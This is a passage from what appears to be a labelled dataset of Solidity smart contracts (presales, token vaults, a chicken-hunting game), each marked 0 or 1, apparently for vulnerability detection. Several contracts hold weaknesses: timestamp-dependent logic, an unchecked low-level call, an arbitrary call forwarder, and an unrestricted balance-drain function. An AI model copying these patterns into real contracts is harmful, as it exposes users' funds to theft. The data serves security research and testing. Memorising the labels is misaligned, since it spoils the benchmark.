_gameWalletAddr);        emit WonderSold(_buyer, _gameWalletAddr, 1, nextDiscountTTWTokenId1);    }        function _buyCommonTTM(uint256 _value, uint256 _mgrId, address _gameWalletAddr, address _buyer)         private    {        require(_gameWalletAddr != address(0));        if (_mgrId == 2) {            require(nextCommonTTMTokenId2 <= 130);            require(_value == 0.99 ether);            nextCommonTTMTokenId2 += 1;            ttmToken.safeGiveByContract(nextCommonTTMTokenId2 - 1, _gameWalletAddr);            emit ManagerSold(_buyer, _gameWalletAddr, 2, nextCommonTTMTokenId2);        } else if (_mgrId == 3) {            require(nextCommonTTMTokenId3 <= 210);            require(_value == 0.99 ether);            nextCommonTTMTokenId3 += 1;            ttmToken.safeGiveByContract(nextCommonTTMTokenId3 - 1, _gameWalletAddr);            emit ManagerSold(_buyer, _gameWalletAddr, 3, nextCommonTTMTokenId3);        } else if (_mgrId == 7) {            require(nextCommonTTMTokenId7 <= 450);            require(_value == 1.49 ether);            nextCommonTTMTokenId7 += 1;            ttmToken.safeGiveByContract(nextCommonTTMTokenId7 - 1, _gameWalletAddr);            emit ManagerSold(_buyer, _gameWalletAddr, 7, nextCommonTTMTokenId7);        } else if (_mgrId == 8) {            require(nextCommonTTMTokenId8 <= 510);            require(_value == 1.49 ether);            nextCommonTTMTokenId8 += 1;            ttmToken.safeGiveByContract(nextCommonTTMTokenId8 - 1, _gameWalletAddr);            emit ManagerSold(_buyer, _gameWalletAddr, 8, nextCommonTTMTokenId8);        } else {            require(false);        }    }    function _buyCommonTTW(uint256 _value, uint256 _wonderId, address _gameWalletAddr, address _buyer)         private    {        require(_gameWalletAddr != address(0));        require(_wonderId == 2);         require(nextCommonTTWTokenId2 <= 90);        require(_value == 0.50 ether);        nextCommonTTWTokenId2 += 1;        ttwToken.safeGiveByContract(nextCommonTTWTokenId2 - 1, _gameWalletAddr);        emit WonderSold(_buyer, _gameWalletAddr, 2, nextCommonTTWTokenId2);    }    function withdrawERC20(address _erc20, address _target, uint256 _amount)        external    {        require(msg.sender == addrFinance || msg.sender == addrAdmin);        require(_amount > 0);        address receiver = _target == address(0) ? addrFinance : _target;        ERC20BaseInterface erc20Contract = ERC20BaseInterface(_erc20);        uint256 balance = erc20Contract.balanceOf(address(this));        require(balance > 0);        if (_amount < balance) {            erc20Contract.transfer(receiver, _amount);        } else {            erc20Contract.transfer(receiver, balance);        }       }    function getPresaleInfo()         external         view         returns(            uint64 ttmCnt1,            uint64 ttmCnt2,            uint64 ttmCnt3,            uint64 ttmCnt6,            uint64 ttmCnt7,            uint64 ttmCnt8,            uint64 ttwCnt1,            uint64 ttwCnt2,            uint64 discountEnd        )    {        ttmCnt1 = 51 - nextDiscountTTMTokenId1;        ttmCnt2 = 131 - nextCommonTTMTokenId2;        ttmCnt3 = 211 - nextCommonTTMTokenId3;        ttmCnt6 = 391 - nextDiscountTTMTokenId6;        ttmCnt7 = 451 - nextCommonTTMTokenId7;        ttmCnt8 = 511 - nextCommonTTMTokenId8;        ttwCnt1 = 31 - nextDiscountTTWTokenId1;        ttwCnt2 = 91 - nextCommonTTWTokenId2;        discountEnd = endDiscountTime;    }}
1<CODESPLIT>contract DSNote {    function time() public constant returns (uint) {        return block.timestamp;    }}
0<CODESPLIT>contract TokenCHK {  function balanceOf(address _owner) public pure returns (uint256 balance) {}}
1<CODESPLIT>contract ESSENTIA_PE is Ownable {    using SafeMath for uint256;    string public name = "ESSENTIA Public Engagement";           uint256 public tokenPrice = 0;             uint256 public maxCap = 0;                 address public FWDaddrETH;                 address public ESSgenesis;                 uint256 public totalSold;                  uint256 public decimals = 18;              mapping (address => uint256) public sold;            uint256 public pubEnd = 0;                           address contractAddr=this;                                uint256 public tokenUnit = uint256(10)**decimals;    TokenCHK essToken;                                                                                    constructor        (        address toETHaddr,        address addrESSgenesis        ) public {        FWDaddrETH = toETHaddr;        ESSgenesis = addrESSgenesis;        essToken = TokenCHK(addrESSgenesis);    }    function () public payable {        buy();                    }    function setFWDaddrETH(address _value) public onlyOwner{      FWDaddrETH=_value;          }    function setGenesis(address _value) public onlyOwner{      ESSgenesis=_value;          }    function setMaxCap(uint256 _value) public onlyOwner{      maxCap=_value;              }    function setPrice(uint256 _value) public onlyOwner{      tokenPrice=_value;          }    function setPubEnd(uint256 _value) public onlyOwner{      pubEnd=_value;              }    function buy() public payable {        require(block.timestamp < pubEnd);                   require(msg.value > 0);                                       require(msg.value + totalSold <= maxCap);                 uint256 tokenAmount = (msg.value * tokenUnit) / tokenPrice;                 require(tokenAmount <= essToken.balanceOf(this));        transferBuy(msg.sender, tokenAmount);                totalSold = totalSold.add(msg.value);                FWDaddrETH.transfer(msg.value);                  }    function withdrawPUB() public returns(bool){        require(block.timestamp > pubEnd);                   require(sold[msg.sender] > 0);                                if(!ESSgenesis.call(bytes4(keccak256("transfer(address,uint256)")), msg.sender, sold[msg.sender])){revert();}        delete sold[msg.sender];        return true;    }    function transferBuy(address _to, uint256 _value) internal returns (bool) {        require(_to != address(0));                          sold[_to]=sold[_to].add(_value);                     return true;    }                                        function EMGwithdraw(uint256 weiValue) external onlyOwner {        require(block.timestamp > pubEnd);                   require(weiValue > 0);                               FWDaddrETH.transfer(weiValue);                   }}
0<CODESPLIT>contract Token {         function totalSupply() constant returns (uint256 supply) {}              function balanceOf(address _owner) constant returns (uint256 balance) {}                        function transfer(address _to, uint256 _value) returns (bool success) {}                             function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}                        function approve(address _spender, uint256 _value) returns (bool success) {}                   function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}    event Transfer(address indexed _from, address indexed _to, uint256 _value);    event Approval(address indexed _owner, address indexed _spender, uint256 _value);    }
0<CODESPLIT>contract MuskToken is StandardToken {    function () {                 throw;    }              string public name;                        uint8 public decimals;                     string public symbol;                      string public version = 'H1.0';                 function MuskToken(        ) {        balances[msg.sender] = 1000000000000000000000000000;                        totalSupply = 1000000000000000000000000000;                                 name = "Musk Token";                                            decimals = 18;                                     symbol = "MUSK";                                    }         function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {        allowed[msg.sender][_spender] = _value;        Approval(msg.sender, _spender, _value);                                   if(!_spender.call(bytes4(bytes32(sha3("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) { throw; }        return true;    }} 
1<CODESPLIT>contract MuskTokenVault is Ownable {    using SafeMath for uint256;         address public teamReserveWallet = 0xBf7E6DC9317dF0e9Fde7847577154e6C5114370d;    address public finalReserveWallet = 0xBf7E6DC9317dF0e9Fde7847577154e6C5114370d;         uint256 public teamReserveAllocation = 240 * (10 ** 6) * (10 ** 18);    uint256 public finalReserveAllocation = 10 * (10 ** 6) * (10 ** 18);         uint256 public totalAllocation = 250 * (10 ** 6) * (10 ** 18);    uint256 public teamTimeLock = 2 * 365 days;    uint256 public teamVestingStages = 8;    uint256 public finalReserveTimeLock = 2 * 365 days;         mapping(address => uint256) public allocations;           mapping(address => uint256) public timeLocks;         mapping(address => uint256) public claimed;         uint256 public lockedAt = 0;    MuskToken public token;         event Allocated(address wallet, uint256 value);         event Distributed(address wallet, uint256 value);         event Locked(uint256 lockTime);         modifier onlyReserveWallets {        require(allocations[msg.sender] > 0);        _;    }         modifier onlyTeamReserve {        require(msg.sender == teamReserveWallet);        require(allocations[msg.sender] > 0);        _;    }         modifier onlyTokenReserve {        require(msg.sender == finalReserveWallet);        require(allocations[msg.sender] > 0);        _;    }         modifier notLocked {        require(lockedAt == 0);        _;    }    modifier locked {        require(lockedAt > 0);        _;    }         modifier notAllocated {        require(allocations[teamReserveWallet] == 0);        require(allocations[finalReserveWallet] == 0);        _;    }    function MuskTokenVault(Token _token) public {        owner = msg.sender;        token = MuskToken(_token);            }    function allocate() public notLocked notAllocated onlyOwner {                 require(token.balanceOf(address(this)) == totalAllocation);                allocations[teamReserveWallet] = teamReserveAllocation;        allocations[finalReserveWallet] = finalReserveAllocation;        Allocated(teamReserveWallet, teamReserveAllocation);        Allocated(finalReserveWallet, finalReserveAllocation);        lock();    }         function lock() internal notLocked onlyOwner {        lockedAt = block.timestamp;        timeLocks[teamReserveWallet] = lockedAt.add(teamTimeLock);        timeLocks[finalReserveWallet] = lockedAt.add(finalReserveTimeLock);        Locked(lockedAt);    }              function recoverFailedLock() external notLocked notAllocated onlyOwner {                 require(token.transfer(owner, token.balanceOf(address(this))));    }         function getTotalBalance() public view returns (uint256 tokensCurrentlyInVault) {        return token.balanceOf(address(this));    }         function getLockedBalance() public view onlyReserveWallets returns (uint256 tokensLocked) {        return allocations[msg.sender].sub(claimed[msg.sender]);    }         function claimTokenReserve() onlyTokenReserve locked public {        address reserveWallet = msg.sender;                 require(block.timestamp > timeLocks[reserveWallet]);                 require(claimed[reserveWallet] == 0);        uint256 amount = allocations[reserveWallet];        claimed[reserveWallet] = amount;        require(token.transfer(reserveWallet, amount));        Distributed(reserveWallet, amount);    }         function claimTeamReserve() onlyTeamReserve locked public {        uint256 vestingStage = teamVestingStage();                 uint256 totalUnlocked = vestingStage.mul(allocations[teamReserveWallet]).div(teamVestingStages);        require(totalUnlocked <= allocations[teamReserveWallet]);                 require(claimed[teamReserveWallet] < totalUnlocked);        uint256 payment = totalUnlocked.sub(claimed[teamReserveWallet]);        claimed[teamReserveWallet] = totalUnlocked;        require(token.transfer(teamReserveWallet, payment));        Distributed(teamReserveWallet, payment);    }         function teamVestingStage() public view onlyTeamReserve returns(uint256){                         uint256 vestingMonths = teamTimeLock.div(teamVestingStages);         uint256 stage = (block.timestamp.sub(lockedAt)).div(vestingMonths);                 if(stage > teamVestingStages){            stage = teamVestingStages;        }        return stage;    }         function canCollect() public view onlyReserveWallets returns(bool) {        return block.timestamp > timeLocks[msg.sender] && claimed[msg.sender] == 0;    }}
0<CODESPLIT>contract SponsoredItemGooRaffle {    uint256 private raffleEndTime;    function drawRandomWinner() public {        require(raffleEndTime < block.timestamp);        return;    }}
0<CODESPLIT>contract OuterWithEth {    Inner1WithEth public myInner1 = new Inner1WithEth();        function callSomeFunctionViaOuter() public payable {        myInner1.callSomeFunctionViaInner1.value(msg.value)();    }}
0<CODESPLIT>contract Inner1WithEth {    Inner2WithEth public myInner2 = new Inner2WithEth();        function callSomeFunctionViaInner1() public payable{        myInner2.doSomething.value(msg.value)();    }}
0<CODESPLIT>contract Inner2WithEth {    uint256 someValue;    event SetValue(uint256 val);        function doSomething() public payable {        someValue = block.timestamp;        emit SetValue(someValue);    }        function getAllMoneyOut() public {        msg.sender.transfer(this.balance);    }}
0<CODESPLIT>contract CHStock is ERC20Interface {  using SafeMath for uint256;     event RedeemShares(    address indexed user,    uint256 shares,    uint256 dividends  );     string public name = "ChickenHuntStock";  string public symbol = "CHS";  uint8 public decimals = 18;  uint256 public totalShares;  uint256 public dividendsPerShare;  uint256 public constant CORRECTION = 1 << 64;  mapping (address => uint256) public ethereumBalance;  mapping (address => uint256) internal shares;  mapping (address => uint256) internal refund;  mapping (address => uint256) internal deduction;  mapping (address => mapping (address => uint256)) internal allowed;     function redeemShares() public {    uint256 _shares = shares[msg.sender];    uint256 _dividends = dividendsOf(msg.sender);    delete shares[msg.sender];    delete refund[msg.sender];    delete deduction[msg.sender];    totalShares = totalShares.sub(_shares);    ethereumBalance[msg.sender] = ethereumBalance[msg.sender].add(_dividends);    emit RedeemShares(msg.sender, _shares, _dividends);  }  function transfer(address _to, uint256 _value) public returns (bool) {    _transfer(msg.sender, _to, _value);    return true;  }  function transferFrom(address _from, address _to, uint256 _value)    public    returns (bool)  {    require(_value <= allowed[_from][msg.sender]);    allowed[_from][msg.sender] -= _value;    _transfer(_from, _to, _value);    return true;  }  function approve(address _spender, uint256 _value) public returns (bool) {    allowed[msg.sender][_spender] = _value;    emit Approval(msg.sender, _spender, _value);    return true;  }  function dividendsOf(address _shareholder) public view returns (uint256) {    return dividendsPerShare.mul(shares[_shareholder]).add(refund[_shareholder]).sub(deduction[_shareholder]) / CORRECTION;  }  function totalSupply() public view returns (uint256) {    return totalShares;  }  function balanceOf(address _owner) public view returns (uint256) {    return shares[_owner];  }  function allowance(address _owner, address _spender)    public    view    returns (uint256)  {    return allowed[_owner][_spender];  }     function _giveShares(address _user, uint256 _ethereum) internal {    if (_ethereum > 0) {      totalShares = totalShares.add(_ethereum);      deduction[_user] = deduction[_user].add(dividendsPerShare.mul(_ethereum));      shares[_user] = shares[_user].add(_ethereum);      dividendsPerShare = dividendsPerShare.add(_ethereum.mul(CORRECTION) / totalShares);      emit Transfer(address(0), _user, _ethereum);    }  }  function _transfer(address _from, address _to, uint256 _value) internal {    require(_to != address(0));    require(_value <= shares[_from]);    uint256 _rawProfit = dividendsPerShare.mul(_value);    uint256 _refund = refund[_from].add(_rawProfit);    uint256 _min = _refund < deduction[_from] ? _refund : deduction[_from];    refund[_from] = _refund.sub(_min);    deduction[_from] = deduction[_from].sub(_min);    deduction[_to] = deduction[_to].add(_rawProfit);    shares[_from] = shares[_from].sub(_value);    shares[_to] = shares[_to].add(_value);    emit Transfer(_from, _to, _value);  }} 
0<CODESPLIT>contract CHGameBase is CHStock {     struct House {    Hunter hunter;    uint256 huntingPower;    uint256 offensePower;    uint256 defensePower;    uint256 huntingMultiplier;    uint256 offenseMultiplier;    uint256 defenseMultiplier;    uint256 depots;    uint256[] pets;  }  struct Hunter {    uint256 strength;    uint256 dexterity;    uint256 constitution;    uint256 resistance;  }  struct Store {    address owner;    uint256 cut;    uint256 cost;    uint256 balance;  }     Store public store;  uint256 public devCut;  uint256 public devFee;  uint256 public altarCut;  uint256 public altarFund;  uint256 public dividendRate;  uint256 public totalChicken;  address public chickenTokenDelegator;  mapping (address => uint256) public lastSaveTime;  mapping (address => uint256) public savedChickenOf;  mapping (address => House) internal houses;     function saveChickenOf(address _user) public returns (uint256) {    uint256 _unclaimedChicken = _unclaimedChickenOf(_user);    totalChicken = totalChicken.add(_unclaimedChicken);    uint256 _chicken = savedChickenOf[_user].add(_unclaimedChicken);    savedChickenOf[_user] = _chicken;    lastSaveTime[_user] = block.timestamp;    return _chicken;  }  function transferChickenFrom(address _from, address _to, uint256 _value)    public    returns (bool)  {    require(msg.sender == chickenTokenDelegator);    require(saveChickenOf(_from) >= _value);    savedChickenOf[_from] = savedChickenOf[_from] - _value;    savedChickenOf[_to] = savedChickenOf[_to].add(_value);    return true;  }  function chickenOf(address _user) public view returns (uint256) {    return savedChickenOf[_user].add(_unclaimedChickenOf(_user));  }     function _payChicken(address _user, uint256 _chicken) internal {    uint256 _unclaimedChicken = _unclaimedChickenOf(_user);    uint256 _extraChicken;    if (_chicken > _unclaimedChicken) {      _extraChicken = _chicken - _unclaimedChicken;      require(savedChickenOf[_user] >= _extraChicken);      savedChickenOf[_user] -= _extraChicken;      totalChicken -= _extraChicken;    } else {      _extraChicken = _unclaimedChicken - _chicken;      totalChicken = totalChicken.add(_extraChicken);      savedChickenOf[_user] += _extraChicken;    }    lastSaveTime[_user] = block.timestamp;  }  function _payEthereumAndDistribute(uint256 _cost) internal {    require(_cost * 100 / 100 == _cost);    _payEthereum(_cost);    uint256 _toShareholders = _cost * dividendRate / 100;    uint256 _toAltar = _cost * altarCut / 100;    uint256 _toStore = _cost * store.cut / 100;    devFee = devFee.add(_cost - _toShareholders - _toAltar - _toStore);    _giveShares(msg.sender, _toShareholders);    altarFund = altarFund.add(_toAltar);    store.balance = store.balance.add(_toStore);  }  function _payEthereum(uint256 _cost) internal {    uint256 _extra;    if (_cost > msg.value) {      _extra = _cost - msg.value;      require(ethereumBalance[msg.sender] >= _extra);      ethereumBalance[msg.sender] -= _extra;    } else {      _extra = msg.value - _cost;      ethereumBalance[msg.sender] = ethereumBalance[msg.sender].add(_extra);    }  }  function _unclaimedChickenOf(address _user) internal view returns (uint256) {    uint256 _timestamp = lastSaveTime[_user];    if (_timestamp > 0 && _timestamp < block.timestamp) {      return houses[_user].huntingPower.mul(        houses[_user].huntingMultiplier      ).mul(block.timestamp - _timestamp) / 100;    } else {      return 0;    }  }  function _houseOf(address _user)    internal    view    returns (House storage _house)  {    _house = houses[_user];    require(_house.depots > 0);  }} 
0<CODESPLIT>contract CHHunter is CHGameBase {     event UpgradeHunter(    address indexed user,    string attribute,    uint256 to  );     struct Config {    uint256 chicken;    uint256 ethereum;    uint256 max;  }     Config public typeA;  Config public typeB;     function upgradeStrength(uint256 _to) external payable {    House storage _house = _houseOf(msg.sender);    uint256 _from = _house.hunter.strength;    require(typeA.max >= _to && _to > _from);    _payForUpgrade(_from, _to, typeA);    uint256 _increment = _house.hunter.dexterity.mul(2).add(8).mul(_to.square() - _from ** 2);    _house.hunter.strength = _to;    _house.huntingPower = _house.huntingPower.add(_increment);    _house.offensePower = _house.offensePower.add(_increment);    emit UpgradeHunter(msg.sender, "strength", _to);  }  function upgradeDexterity(uint256 _to) external payable {    House storage _house = _houseOf(msg.sender);    uint256 _from = _house.hunter.dexterity;    require(typeB.max >= _to && _to > _from);    _payForUpgrade(_from, _to, typeB);    uint256 _increment = _house.hunter.strength.square().mul((_to - _from).mul(2));    _house.hunter.dexterity = _to;    _house.huntingPower = _house.huntingPower.add(_increment);    _house.offensePower = _house.offensePower.add(_increment);    emit UpgradeHunter(msg.sender, "dexterity", _to);  }  function upgradeConstitution(uint256 _to) external payable {    House storage _house = _houseOf(msg.sender);    uint256 _from = _house.hunter.constitution;    require(typeA.max >= _to && _to > _from);    _payForUpgrade(_from, _to, typeA);    uint256 _increment = _house.hunter.resistance.mul(2).add(8).mul(_to.square() - _from ** 2);    _house.hunter.constitution = _to;    _house.defensePower = _house.defensePower.add(_increment);    emit UpgradeHunter(msg.sender, "constitution", _to);  }  function upgradeResistance(uint256 _to) external payable {    House storage _house = _houseOf(msg.sender);    uint256 _from = _house.hunter.resistance;    require(typeB.max >= _to && _to > _from);    _payForUpgrade(_from, _to, typeB);    uint256 _increment = _house.hunter.constitution.square().mul((_to - _from).mul(2));    _house.hunter.resistance = _to;    _house.defensePower = _house.defensePower.add(_increment);    emit UpgradeHunter(msg.sender, "resistance", _to);  }     function _payForUpgrade(uint256 _from, uint256 _to, Config _type) internal {    uint256 _chickenCost = _type.chicken.mul(_gapOfCubeSum(_from, _to));    _payChicken(msg.sender, _chickenCost);    uint256 _ethereumCost = _type.ethereum.mul(_gapOfSquareSum(_from, _to));    _payEthereumAndDistribute(_ethereumCost);  }  function _gapOfSquareSum(uint256 _before, uint256 _after)    internal    pure    returns (uint256)  {         return (_after * (_after - 1) * (2 * _after - 1) - _before * (_before - 1) * (2 * _before - 1)) / 6;  }  function _gapOfCubeSum(uint256 _before, uint256 _after)    internal    pure    returns (uint256)  {         return ((_after * (_after - 1)) ** 2 - (_before * (_before - 1)) ** 2) >> 2;  }} 
0<CODESPLIT>contract CHHouse is CHHunter {     event UpgradePet(    address indexed user,    uint256 id,    uint256 to  );  event UpgradeDepot(    address indexed user,    uint256 to  );  event BuyItem(    address indexed from,    address indexed to,    uint256 indexed id,    uint256 cost  );  event BuyStore(    address indexed from,    address indexed to,    uint256 cost  );     struct Pet {    uint256 huntingPower;    uint256 offensePower;    uint256 defensePower;    uint256 chicken;    uint256 ethereum;    uint256 max;  }  struct Item {    address owner;    uint256 huntingMultiplier;    uint256 offenseMultiplier;    uint256 defenseMultiplier;    uint256 cost;  }  struct Depot {    uint256 ethereum;    uint256 max;  }     uint256 public constant INCREMENT_RATE = 12;    Depot public depot;  Pet[] public pets;  Item[] public items;     function buyDepots(uint256 _amount) external payable {    House storage _house = _houseOf(msg.sender);    _house.depots = _house.depots.add(_amount);    require(_house.depots <= depot.max);    _payEthereumAndDistribute(_amount.mul(depot.ethereum));    emit UpgradeDepot(msg.sender, _house.depots);  }  function buyPets(uint256 _id, uint256 _amount) external payable {    require(_id < pets.length);    Pet memory _pet = pets[_id];    uint256 _chickenCost = _amount * _pet.chicken;    _payChicken(msg.sender, _chickenCost);    uint256 _ethereumCost = _amount * _pet.ethereum;    _payEthereumAndDistribute(_ethereumCost);    House storage _house = _houseOf(msg.sender);    if (_house.pets.length < _id + 1) {      _house.pets.length = _id + 1;    }    _house.pets[_id] = _house.pets[_id].add(_amount);    require(_house.pets[_id] <= _pet.max);    _house.huntingPower = _house.huntingPower.add(_pet.huntingPower * _amount);    _house.offensePower = _house.offensePower.add(_pet.offensePower * _amount);    _house.defensePower = _house.defensePower.add(_pet.defensePower * _amount);    emit UpgradePet(msg.sender, _id, _house.pets[_id]);  }     function buyItem(uint256 _id) external payable {    Item storage _item = items[_id];    address _from = _item.owner;    uint256 _price = _item.cost.mul(INCREMENT_RATE) / 10;    _payEthereum(_price);    saveChickenOf(_from);    House storage _fromHouse = _houseOf(_from);    _fromHouse.huntingMultiplier = _fromHouse.huntingMultiplier.sub(_item.huntingMultiplier);    _fromHouse.offenseMultiplier = _fromHouse.offenseMultiplier.sub(_item.offenseMultiplier);    _fromHouse.defenseMultiplier = _fromHouse.defenseMultiplier.sub(_item.defenseMultiplier);    saveChickenOf(msg.sender);    House storage _toHouse = _houseOf(msg.sender);    _toHouse.huntingMultiplier = _toHouse.huntingMultiplier.add(_item.huntingMultiplier);    _toHouse.offenseMultiplier = _toHouse.offenseMultiplier.add(_item.offenseMultiplier);    _toHouse.defenseMultiplier = _toHouse.defenseMultiplier.add(_item.defenseMultiplier);    uint256 _halfMargin = _price.sub(_item.cost) / 2;    devFee = devFee.add(_halfMargin);    ethereumBalance[_from] = ethereumBalance[_from].add(_price - _halfMargin);    items[_id].cost = _price;    items[_id].owner = msg.sender;    emit BuyItem(_from, msg.sender, _id, _price);  }     function buyStore() external payable {    address _from = store.owner;    uint256 _price = store.cost.mul(INCREMENT_RATE) / 10;    _payEthereum(_price);    uint256 _halfMargin = (_price - store.cost) / 2;    devFee = devFee.add(_halfMargin);    ethereumBalance[_from] = ethereumBalance[_from].add(_price - _halfMargin).add(store.balance);    store.cost = _price;    store.owner = msg.sender;    delete store.balance;    emit BuyStore(_from, msg.sender, _price);  }  function withdrawStoreBalance() public {    ethereumBalance[store.owner] = ethereumBalance[store.owner].add(store.balance);    delete store.balance;  }} 
0<CODESPLIT>contract CHArena is CHHouse {     event Attack(    address indexed attacker,    address indexed defender,    uint256 booty  );     mapping(address => uint256) public attackCooldown;  uint256 public cooldownTime;     function attack(address _target) external {    require(attackCooldown[msg.sender] < block.timestamp);    House storage _attacker = houses[msg.sender];    House storage _defender = houses[_target];    if (_attacker.offensePower.mul(_attacker.offenseMultiplier)        > _defender.defensePower.mul(_defender.defenseMultiplier)) {      uint256 _chicken = saveChickenOf(_target);      _chicken = _defender.depots > 0 ? _chicken / _defender.depots : _chicken;      savedChickenOf[_target] = savedChickenOf[_target] - _chicken;      savedChickenOf[msg.sender] = savedChickenOf[msg.sender].add(_chicken);      attackCooldown[msg.sender] = block.timestamp + cooldownTime;      emit Attack(msg.sender, _target, _chicken);    }  }} 
0<CODESPLIT>contract CHAltar is CHArena {     event NewAltarRecord(uint256 id, uint256 ethereum);  event ChickenToAltar(address indexed user, uint256 id, uint256 chicken);  event EthereumFromAltar(address indexed user, uint256 id, uint256 ethereum);     struct AltarRecord {    uint256 ethereum;    uint256 chicken;  }  struct TradeBook {    uint256 altarRecordId;    uint256 chicken;  }     uint256 public genesis;  mapping (uint256 => AltarRecord) public altarRecords;  mapping (address => TradeBook) public tradeBooks;     function chickenToAltar(uint256 _chicken) external {    require(_chicken > 0);    _payChicken(msg.sender, _chicken);    uint256 _id = _getCurrentAltarRecordId();    AltarRecord storage _altarRecord = _getAltarRecord(_id);    require(_altarRecord.ethereum * _chicken / _chicken == _altarRecord.ethereum);    TradeBook storage _tradeBook = tradeBooks[msg.sender];    if (_tradeBook.altarRecordId < _id) {      _resolveTradeBook(_tradeBook);      _tradeBook.altarRecordId = _id;    }    _altarRecord.chicken = _altarRecord.chicken.add(_chicken);    _tradeBook.chicken += _chicken;    emit ChickenToAltar(msg.sender, _id, _chicken);  }  function ethereumFromAltar() external {    uint256 _id = _getCurrentAltarRecordId();    TradeBook storage _tradeBook = tradeBooks[msg.sender];    require(_tradeBook.altarRecordId < _id);    _resolveTradeBook(_tradeBook);  }  function tradeBookOf(address _user)    public    view    returns (      uint256 _id,      uint256 _ethereum,      uint256 _totalChicken,      uint256 _chicken,      uint256 _income    )  {    TradeBook memory _tradeBook = tradeBooks[_user];    _id = _tradeBook.altarRecordId;    _chicken = _tradeBook.chicken;    AltarRecord memory _altarRecord = altarRecords[_id];    _totalChicken = _altarRecord.chicken;    _ethereum = _altarRecord.ethereum;    _income = _totalChicken > 0 ? _ethereum.mul(_chicken) / _totalChicken : 0;  }     function _resolveTradeBook(TradeBook storage _tradeBook) internal {    if (_tradeBook.chicken > 0) {      AltarRecord memory _oldAltarRecord = altarRecords[_tradeBook.altarRecordId];      uint256 _ethereum = _oldAltarRecord.ethereum.mul(_tradeBook.chicken) / _oldAltarRecord.chicken;      delete _tradeBook.chicken;      ethereumBalance[msg.sender] = ethereumBalance[msg.sender].add(_ethereum);      emit EthereumFromAltar(msg.sender, _tradeBook.altarRecordId, _ethereum);    }  }  function _getCurrentAltarRecordId() internal view returns (uint256) {    return (block.timestamp - genesis) / 86400;  }  function _getAltarRecord(uint256 _id) internal returns (AltarRecord storage _altarRecord) {    _altarRecord = altarRecords[_id];    if (_altarRecord.ethereum == 0) {      uint256 _ethereum = altarFund / 10;      _altarRecord.ethereum = _ethereum;      altarFund -= _ethereum;      emit NewAltarRecord(_id, _ethereum);    }  }} 
0<CODESPLIT>contract CHCommittee is CHAltar {     event NewPet(    uint256 id,    uint256 huntingPower,    uint256 offensePower,    uint256 defense,    uint256 chicken,    uint256 ethereum,    uint256 max  );  event ChangePet(    uint256 id,    uint256 chicken,    uint256 ethereum,    uint256 max  );  event NewItem(    uint256 id,    uint256 huntingMultiplier,    uint256 offenseMultiplier,    uint256 defenseMultiplier,    uint256 ethereum  );  event SetDepot(uint256 ethereum, uint256 max);  event SetConfiguration(    uint256 chickenA,    uint256 ethereumA,    uint256 maxA,    uint256 chickenB,    uint256 ethereumB,    uint256 maxB  );  event SetDistribution(    uint256 dividendRate,    uint256 altarCut,    uint256 storeCut,    uint256 devCut  );  event SetCooldownTime(uint256 cooldownTime);  event SetNameAndSymbol(string name, string symbol);  event SetDeveloper(address developer);  event SetCommittee(address committee);     address public committee;  address public developer;     function callFor(address _to, uint256 _value, uint256 _gas, bytes _code)    external    payable    onlyCommittee    returns (bool)  {    return _to.call.value(_value).gas(_gas)(_code);  }  function addPet(    uint256 _huntingPower,    uint256 _offensePower,    uint256 _defense,    uint256 _chicken,    uint256 _ethereum,    uint256 _max  )    public    onlyCommittee  {    require(_max > 0);    require(_max == uint256(uint32(_max)));    uint256 _newLength = pets.push(      Pet(_huntingPower, _offensePower, _defense, _chicken, _ethereum, _max)    );    emit NewPet(      _newLength - 1,      _huntingPower,      _offensePower,      _defense,      _chicken,      _ethereum,      _max    );  }  function changePet(    uint256 _id,    uint256 _chicken,    uint256 _ethereum,    uint256 _max  )    public    onlyCommittee  {    require(_id < pets.length);    Pet storage _pet = pets[_id];    require(_max >= _pet.max && _max == uint256(uint32(_max)));    _pet.chicken = _chicken;    _pet.ethereum = _ethereum;    _pet.max = _max;    emit ChangePet(_id, _chicken, _ethereum, _max);  }  function addItem(    uint256 _huntingMultiplier,    uint256 _offenseMultiplier,    uint256 _defenseMultiplier,    uint256 _price  )    public    onlyCommittee  {    uint256 _cap = 1 << 16;    require(      _huntingMultiplier < _cap &&      _offenseMultiplier < _cap &&      _defenseMultiplier < _cap    );    saveChickenOf(committee);    House storage _house = _houseOf(committee);    _house.huntingMultiplier = _house.huntingMultiplier.add(_huntingMultiplier);    _house.offenseMultiplier = _house.offenseMultiplier.add(_offenseMultiplier);    _house.defenseMultiplier = _house.defenseMultiplier.add(_defenseMultiplier);    uint256 _newLength = items.push(      Item(        committee,        _huntingMultiplier,        _offenseMultiplier,        _defenseMultiplier,        _price      )    );    emit NewItem(      _newLength - 1,      _huntingMultiplier,      _offenseMultiplier,      _defenseMultiplier,      _price    );  }  function setDepot(uint256 _price, uint256 _max) public onlyCommittee {    require(_max >= depot.max);    depot.ethereum = _price;    depot.max = _max;    emit SetDepot(_price, _max);  }  function setConfiguration(    uint256 _chickenA,    uint256 _ethereumA,    uint256 _maxA,    uint256 _chickenB,    uint256 _ethereumB,    uint256 _maxB  )    public    onlyCommittee  {    require(_maxA >= typeA.max && (_maxA == uint256(uint32(_maxA))));    require(_maxB >= typeB.max && (_maxB == uint256(uint32(_maxB))));    typeA.chicken = _chickenA;    typeA.ethereum = _ethereumA;    typeA.max = _maxA;    typeB.chicken = _chickenB;    typeB.ethereum = _ethereumB;    typeB.max = _maxB;    emit SetConfiguration(_chickenA, _ethereumA, _maxA, _chickenB, _ethereumB, _maxB);  }  function setDistribution(    uint256 _dividendRate,    uint256 _altarCut,    uint256 _storeCut,    uint256 _devCut  )    public    onlyCommittee  {    require(_storeCut > 0);    require(      _dividendRate.add(_altarCut).add(_storeCut).add(_devCut) == 100    );    dividendRate = _dividendRate;    altarCut = _altarCut;    store.cut = _storeCut;    devCut = _devCut;    emit SetDistribution(_dividendRate, _altarCut, _storeCut, _devCut);  }  function setCooldownTime(uint256 _cooldownTime) public onlyCommittee {    cooldownTime = _cooldownTime;    emit SetCooldownTime(_cooldownTime);  }  function setNameAndSymbol(string _name, string _symbol)    public    onlyCommittee  {    name = _name;    symbol = _symbol;    emit SetNameAndSymbol(_name, _symbol);  }  function setDeveloper(address _developer) public onlyCommittee {    require(_developer != address(0));    withdrawDevFee();    developer = _developer;    emit SetDeveloper(_developer);  }  function setCommittee(address _committee) public onlyCommittee {    require(_committee != address(0));    committee = _committee;    emit SetCommittee(_committee);  }  function withdrawDevFee() 